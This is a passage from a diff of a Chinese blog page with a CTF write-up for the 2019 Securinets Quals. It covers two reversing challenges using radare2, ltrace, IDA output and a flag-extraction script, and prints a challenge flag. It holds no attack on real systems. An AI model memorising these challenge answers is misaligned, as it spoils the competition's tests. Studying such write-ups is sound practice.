@@ -1,441 +1,1235 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
+
+
+
+
 <head><meta name="generator" content="Hexo 3.8.0">
-  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <title>2019-Securinets-CTF-Quals | AssassinQ</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  
-  <meta name="keywords" content="wp">
-  
-  
-  
-  
-  <meta name="description" content="比赛的时候做了四道题，顺便复现几道没做出来的题目。">
-<meta name="keywords" content="wp">
-<meta property="og:type" content="article">
-<meta property="og:title" content="2019-Securinets-CTF-Quals">
-<meta property="og:url" content="blog.b3ale.cn/2019/03/25/2019-Securinets-CTF-Quals/index.html">
-<meta property="og:site_name" content="AssassinQ">
-<meta property="og:description" content="比赛的时候做了四道题，顺便复现几道没做出来的题目。">
-<meta property="og:locale" content="default">
-<meta property="og:image" content="/pics/2019-Securinets-CTF-Quals/1.png">
-<meta property="og:image" content="/pics/2019-Securinets-CTF-Quals/2.png">
-<meta property="og:image" content="/pics/2019-Securinets-CTF-Quals/3.png">
-<meta property="og:image" content="/pics/2019-Securinets-CTF-Quals/4.png">
-<meta property="og:image" content="/pics/2019-Securinets-CTF-Quals/5.png">
-<meta property="og:image" content="/pics/2019-Securinets-CTF-Quals/6.png">
-<meta property="og:image" content="/pics/2019-Securinets-CTF-Quals/7.png">
-<meta property="og:image" content="/pics/2019-Securinets-CTF-Quals/8.png">
-<meta property="og:image" content="/pics/2019-Securinets-CTF-Quals/9.png">
-<meta property="og:image" content="/pics/2019-Securinets-CTF-Quals/10.png">
-<meta property="og:image" content="/pics/2019-Securinets-CTF-Quals/11.png">
-<meta property="og:image" content="/pics/2019-Securinets-CTF-Quals/12.png">
-<meta property="og:image" content="/pics/2019-Securinets-CTF-Quals/13.png">
-<meta property="og:updated_time" content="2019-08-26T01:16:29.378Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2019-Securinets-CTF-Quals">
-<meta name="twitter:description" content="比赛的时候做了四道题，顺便复现几道没做出来的题目。">
-<meta name="twitter:image" content="/pics/2019-Securinets-CTF-Quals/1.png">
-  
-    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
-  
-  <link rel="icon" href="/css/images/favicon.ico">
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
-  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
-  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
-  <style type="text/css">
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
-    
-  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <meta name="theme-color" content="#005f6b">
+  <meta name="description" content="ZJGSU-IS-17">
+  <meta name="author" content>
+  <meta name="keywords" content>
+  <title>2019-Securinets-CTF-Quals - AssassinQ</title>
 
-  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
-  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
 
-  <script src="/js/jquery-3.1.1.min.js"></script>
 
-  <!-- Bootstrap core CSS -->
-  <link rel="stylesheet" href="/css/bootstrap.css">
-  <link rel="stylesheet" href="/css/fashion.css">
-  <link rel="stylesheet" href="/css/glyphs.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
 
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
-</html>
 
 
-  <body data-spy="scroll" data-target="#toc" data-offset="50">
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>AssassinQ</strong>&nbsp;</a>
 
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
 
-  
-  
-  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="site-header-image">
-    <img id="originBg" width="100%" alt="Hike News" src>
-  </div>
-
-  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
-    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
-  </div>
-
-  <script>
-        var imgUrls = "css/images/pose01.jpg".split(",");
-        var random = Math.floor((Math.random() * imgUrls.length ));
-        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
-          document.getElementById("originBg").src=imgUrls[random];
-          document.getElementById("blurBg").src=imgUrls[random];
-        } else {
-          document.getElementById("originBg").src='/' + imgUrls[random];
-          document.getElementById("blurBg").src='/' + imgUrls[random];
-        }
-    </script>
-
-
-
-
-<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
-  <div class="clearfix container">
-      <div class="site-branding">
-
-          <h1 class="site-title">
-            
-              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
-            
-          </h1>
-          
-          
-            <div class="site-description">ZJGSU-IS-17</div>
-          
-            
-          <nav id="main-navigation" class="main-navigation" role="navigation">
-            <a class="nav-open">Menu</a>
-            <a class="nav-close">Close</a>
-
-            <div class="clearfix sf-menu">
-              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
-                    
-              </ul>
-            </div>
-          </nav>
-
-      </div>
-  </div>
-</header>
-
-
-  <div id="container">
-    <div id="wrap">
-            
-      <div id="content" class="outer">
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-          <section id="main" style="float:none;"><article id="post-2019-Securinets-CTF-Quals" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
         
-  
-    <h1 class="thumb" itemprop="name">
-      2019-Securinets-CTF-Quals
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      	<a href="/2019/03/25/2019-Securinets-CTF-Quals/" class="article-date">
-	  <time datetime="2019-03-25T00:45:10.000Z" itemprop="datePublished">March 25, 2019</time>
-	</a>
-
-       
-      
-
-	  |
-	  4.2k words
-	  |
-	  23 minute(s) to read
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">Links</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>比赛的时候做了四道题，顺便复现几道没做出来的题目。</p>
-<p><img src="/pics/2019-Securinets-CTF-Quals/1.png" alt="AssassinQ on Scoreboard"></p>
-<a id="more"></a>
-<h1 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h1><h2 id="AutomateMe"><a href="#AutomateMe" class="headerlink" title="AutomateMe"></a>AutomateMe</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@91120f278fdd:~/ctf/2019-Securinets/re/AutomateMe<span class="comment"># file ./bin</span></span><br><span class="line">./bin: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=cbafec6cc96cbdd6feea8085adeeafb3fc05c11f, not stripped</span><br></pre></td></tr></table></figure>
-<p>用 radare2 分析一下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@91120f278fdd:~/ctf/2019-Securinets/re/AutomateMe# radare2 ./bin</span><br><span class="line"> -- Execute commands on a temporary offset by appending &apos;@ offset&apos; to your command.</span><br><span class="line">[0x000005d0]&gt; aaa</span><br><span class="line">[Invalid instruction of 16368 bytes at 0x124 entry0 (aa)</span><br><span class="line">Invalid instruction of 16366 bytes at 0x124</span><br><span class="line">[x] Analyze all flags starting with sym. and entry0 (aa)</span><br><span class="line">[x] Analyze function calls (aac)</span><br><span class="line">[x] Analyze len bytes of instructions for references (aar)</span><br><span class="line">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)</span><br><span class="line">...</span><br><span class="line">[x] Type matching analysis for all functions (aaft)</span><br><span class="line">[x] Use -AA or aaaa to perform additional experimental analysis.</span><br><span class="line">[0x000005d0]&gt; s main</span><br><span class="line">[0x000006da]&gt; pdf</span><br><span class="line">Linear size differs too much from the bbsum, please use pdr instead.</span><br><span class="line">[0x000006da]&gt; pdr</span><br><span class="line">Do you want to print 1316 lines? (y/N) y</span><br><span class="line">...</span><br><span class="line">| 0x00000786      3c68           cmp al, 0x68                          ; &apos;h&apos;</span><br><span class="line">| ; DATA XREF from main (+0x173d3)</span><br><span class="line">| 0x00000788      7416           je 0x7a0</span><br><span class="line">| ----------- true: 0x000007a0  false: 0x0000078a</span><br><span class="line">| ; DATA XREF from main (+0x1742f)</span><br><span class="line">| 0x0000078a      488d3de57c02.  lea rdi, str.nope_:                   ; 0x28476 ; &quot;nope :( &quot; ; const char *format</span><br><span class="line">| ; DATA XREF from main (+0x1758d)</span><br><span class="line">| 0x00000791      b800000000     mov eax, 0</span><br><span class="line">| ; DATA XREF from main (+0x17681)</span><br><span class="line">| 0x00000796      e815feffff     call sym.imp.printf                   ; int printf(const char *format)</span><br><span class="line">| ; DATA XREF from main (+0x1776e)</span><br><span class="line">| 0x0000079b      e9007c0200     jmp 0x283a0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p>在<code>0x00000786</code>处可以看到将输入的某个字符与<code>h</code>进行了比较。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">| ----------- true: 0x000283a0</span><br><span class="line">| ; CODE XREF from main (0x788)</span><br><span class="line">| ; DATA XREF from main (+0x17869)</span><br><span class="line">| 0x000007a0      488b45e0       mov rax, qword [s]</span><br><span class="line">| ; DATA XREF from main (+0x17928)</span><br><span class="line">| 0x000007a4      4883c008       add rax, 8</span><br><span class="line">| ; DATA XREF from main (+0x179e7)</span><br><span class="line">| 0x000007a8      488b00         mov rax, qword [rax]</span><br><span class="line">| ; DATA XREF from main (+0x17a86)</span><br><span class="line">| 0x000007ab      0fb64002       movzx eax, byte [rax + 2]             ; [0x2:1]=76</span><br><span class="line">| ; DATA XREF from main (+0x17b4c)</span><br><span class="line">| 0x000007af      8845ff         mov byte [local_1h], al</span><br><span class="line">| ; DATA XREF from main (+0x17bdd)</span><br><span class="line">| 0x000007b2      8075ffeb       xor byte [local_1h], 0xeb</span><br><span class="line">| ; DATA XREF from main (+0x17ca3)</span><br><span class="line">| 0x000007b6      807dff8e       cmp byte [local_1h], 0x8e</span><br><span class="line">| ; DATA XREF from main (+0x17d70)</span><br><span class="line">| 0x000007ba      7416           je 0x7d2</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p>往下看变得复杂了一些，将输入和<code>0xeb</code>异或了一下再与<code>0x8e</code>比较，故这里的字符是<code>chr(0xeb^0x8e)=&#39;e&#39;</code>。</p>
-<p>事实证明，这道题用 Ghidra 很方便。这个文件的 main 函数非常大，ida 都没法反编译。Ghidra 可以快速地分析，然后我们通过 python 正则匹配一下就能得到 flag：</p>
-<p><img src="/pics/2019-Securinets-CTF-Quals/2.png" alt="Ghidra强大的反编译功能"></p>
-<p>正则匹配：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'bin.c'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    txt = f.read()</span><br><span class="line">    regex = re.compile(<span class="string">r'\'(.*)\''</span>)</span><br><span class="line">    <span class="comment"># print regex.findall(txt)</span></span><br><span class="line">    output = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> regex.findall(txt):</span><br><span class="line">        output += c</span><br><span class="line">    <span class="keyword">print</span> output</span><br></pre></td></tr></table></figure>
-<p>输出 flag：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./solve.py | grep -E <span class="string">"flag|securinets"</span></span><br><span class="line">... here is you flag securinets&#123;automating_everything_is_the_new_future&#125; ...</span><br></pre></td></tr></table></figure>
-<h2 id="Warmup-Welcome-to-securinets-CTF"><a href="#Warmup-Welcome-to-securinets-CTF" class="headerlink" title="Warmup: Welcome to securinets CTF!"></a>Warmup: Welcome to securinets CTF!</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@91120f278fdd:~/ctf/2019-Securinets/re/warmup# file warmup</span><br><span class="line">warmup: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=93a17fbbf5e51001a87144a35c32ea813c43cbf4, stripped</span><br></pre></td></tr></table></figure>
-<p>ltrace 一下，大概能看出做了什么：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@91120f278fdd:~/ctf/2019-Securinets<span class="comment"># ltrace ./warmup</span></span><br><span class="line">puts(<span class="string">"Welcome to securinets quals CTF "</span>...Welcome to securinets quals CTF :)</span><br><span class="line">)                                                 = 35</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"PASSCODE:"</span>)                                                                         = 9</span><br><span class="line">fgets(PASSCODE:ABC123</span><br><span class="line"><span class="string">"ABC123\n"</span>, 100, 0x7f6912b8aa00)                                                      = 0x55e762c220e0</span><br><span class="line">strlen(<span class="string">"ABC123\n"</span>)                                                                          = 7</span><br><span class="line">...</span><br><span class="line">malloc(137)                                                                                 = 0x55e763504a80</span><br><span class="line">strlen(<span class="string">"QUJDMTIzCgCA/gMAcP4AADhpAAABABBp"</span>...)                                               = 136</span><br><span class="line">...</span><br><span class="line">strlen(<span class="string">"QUJDMTIz"</span>)                                                                          = 8</span><br><span class="line">strlen(<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef"</span>...)                                               = 62</span><br><span class="line">...</span><br><span class="line">puts(<span class="string">"NOPE :( "</span>NOPE :(</span><br><span class="line">)                                                                            = 9</span><br><span class="line"><span class="built_in">exit</span>(0 &lt;no <span class="built_in">return</span> ...&gt;</span><br><span class="line">+++ exited (status 0) +++</span><br></pre></td></tr></table></figure>
-<p>放进 ida 里看看 main 函数：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> length; <span class="comment">// eax</span></span><br><span class="line">  _BOOL4 v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-1C8h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-1C4h]</span></span><br><span class="line">  <span class="keyword">char</span> *s; <span class="comment">// [rsp+18h] [rbp-1B8h]</span></span><br><span class="line">  <span class="keyword">int</span> v32[<span class="number">102</span>]; <span class="comment">// [rsp+20h] [rbp-1B0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v33; <span class="comment">// [rsp+1B8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v33 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to securinets quals CTF :)"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"PASSCODE:"</span>, a2);</span><br><span class="line">  fgets(passcode, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(passcode); ++i )</span><br><span class="line">    v32[i] = passcode[i];</span><br><span class="line">  length = sub_89A(<span class="number">0x64</span>u);</span><br><span class="line">  s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(length + <span class="number">1</span>);</span><br><span class="line">  base64_encode((__int64)v32, <span class="number">0x64</span>u, (__int64)s);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(s) &amp;&amp; s[j] != <span class="string">'C'</span>; ++j )</span><br><span class="line">    base64_string[j] = s[j];</span><br><span class="line">  base64_string[<span class="built_in">strlen</span>(base64_string)] = <span class="number">0</span>;</span><br><span class="line">  v4 = sub_B88(base64_string);</span><br><span class="line">  v5 = (<span class="keyword">unsigned</span> __int64)sub_C07(base64_string) + v4;</span><br><span class="line">  v6 = (<span class="keyword">unsigned</span> __int64)sub_C68((__int64)base64_string) + v5;</span><br><span class="line">  v7 = (<span class="keyword">unsigned</span> __int64)sub_E25(base64_string) + v6;</span><br><span class="line">  v8 = (<span class="keyword">unsigned</span> __int64)sub_C90(base64_string) + v7;</span><br><span class="line">  v9 = (<span class="keyword">unsigned</span> __int64)sub_CAD(base64_string) + v8;</span><br><span class="line">  v10 = (<span class="keyword">unsigned</span> __int64)sub_CDA(base64_string) + v9;</span><br><span class="line">  v11 = (<span class="keyword">unsigned</span> __int64)sub_DA8(base64_string) + v10;</span><br><span class="line">  v12 = (<span class="keyword">unsigned</span> __int64)sub_DF4(base64_string) + v11;</span><br><span class="line">  v13 = (<span class="keyword">unsigned</span> __int64)sub_E6E(base64_string) + v12;</span><br><span class="line">  v14 = (<span class="keyword">unsigned</span> __int64)sub_ECA(base64_string) + v13;</span><br><span class="line">  v15 = (<span class="keyword">unsigned</span> __int64)sub_EF7(base64_string) + v14;</span><br><span class="line">  v16 = (<span class="keyword">unsigned</span> __int64)sub_F53(base64_string) + v15;</span><br><span class="line">  v17 = (<span class="keyword">unsigned</span> __int64)sub_FAF(base64_string) + v16;</span><br><span class="line">  v18 = (<span class="keyword">unsigned</span> __int64)sub_E51(s) + v17;</span><br><span class="line">  v19 = (<span class="keyword">unsigned</span> __int64)sub_107E(base64_string) + v18;</span><br><span class="line">  v20 = (<span class="keyword">unsigned</span> __int64)sub_10AF(base64_string) + v19;</span><br><span class="line">  v21 = (<span class="keyword">unsigned</span> __int64)sub_10E0(base64_string) + v20;</span><br><span class="line">  v22 = (<span class="keyword">unsigned</span> __int64)sub_10FD(base64_string) + v21;</span><br><span class="line">  v23 = (<span class="keyword">unsigned</span> __int64)sub_112A(base64_string) + v22;</span><br><span class="line">  v24 = (<span class="keyword">unsigned</span> __int64)sub_11FB(base64_string) + v23;</span><br><span class="line">  v25 = (<span class="keyword">unsigned</span> __int64)sub_1234(base64_string) + v24;</span><br><span class="line">  v26 = (<span class="keyword">unsigned</span> __int64)sub_1287(base64_string) + v25;</span><br><span class="line">  v27 = (<span class="keyword">unsigned</span> __int64)sub_12B6(base64_string) + v26;</span><br><span class="line">  <span class="keyword">if</span> ( v27 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_1309(base64_string) == <span class="number">25</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Good job! u know what to do and submit!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"NOPE :("</span>);</span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>一开始做了一个 base64，然后一系列的没有规律的加密，我们所需要做的是耐心地倒退出来就行了。脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 